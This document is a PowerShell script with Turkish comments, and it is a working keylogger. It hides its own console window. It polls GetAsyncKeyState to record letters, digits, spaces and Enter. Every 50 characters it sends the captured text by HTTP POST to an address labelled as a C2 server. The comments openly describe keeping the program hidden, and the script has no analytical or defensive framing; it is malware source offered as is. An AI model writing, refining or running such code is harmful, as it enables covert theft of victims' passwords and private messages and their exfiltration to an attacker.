# Arka planda tamamen gizli kalması için konsol penceresini yok et
$window = Add-Type -memberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(int hWnd, int nCmdShow);
"@ -name "Win32ShowWindowAsync" -namespace Win32Functions -passThru
$window::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)

# C2 Sunucu Adresin
$C2_SERVER = "http://192.168.1.10:8080/upload"
$global:KeyLog = ""

# Tuşları yakalayan C# API imzasını yükle
$Signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
$API = Add-Type -MemberDefinition $Signature -Name 'Keylogger' -Namespace 'Muzoovy' -PassThru

# Tuş isimlerini düzgün okumak için Forms assembly'sini ekle
Add-Type -AssemblyName System.Windows.Forms

while ($true) {
    Start-Sleep -Milliseconds 40
    for ($ascii = 8; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)

        # Tuşa basıldığını net ve stabil anlamak için bitwise AND işlemi (-32767 yerine)
        if (($state -band 0x8000) -eq 0x8000) {
            $key = [System.Windows.Forms.Keys]$ascii

            # Sadece harfler, rakamlar ve boşluk tuşunu logla (Gereksiz sembolleri filtrele)
            if (($ascii -ge 65 -and $ascii -le 90) -or ($ascii -ge 48 -and $ascii -le 57) -or $ascii -eq 32) {
                if ($ascii -eq 32) { $global:KeyLog += " " }
                else { $global:KeyLog += $key.ToString() }
            }
            # Enter tuşuna basıldığında logda alt satıra geçmesi için
            elseif ($ascii -eq 13) {
                $global:KeyLog += "[ENTER]`n"
            }
        }
    }

    # RAM'deki log 50 karaktere ulaştıysa gönder
    if ($global:KeyLog.Length -ge 50) {
        try {
            # Hata verirse kodu durdurup catch'e düşürmesi için ErrorAction Stop yapıldı
            Invoke-RestMethod -Uri $C2_SERVER -Method Post -Body @{ log = $global:KeyLog } -ErrorAction Stop
            $global:KeyLog = "" # Başarılıysa sıfırla
        } catch {
            # Sunucu kapalıysa veya ağ yoksa ağı boğmamak (DDoS yapmamak) için logu mecburen sıfırla
            $global:KeyLog = ""
        }
    }
}
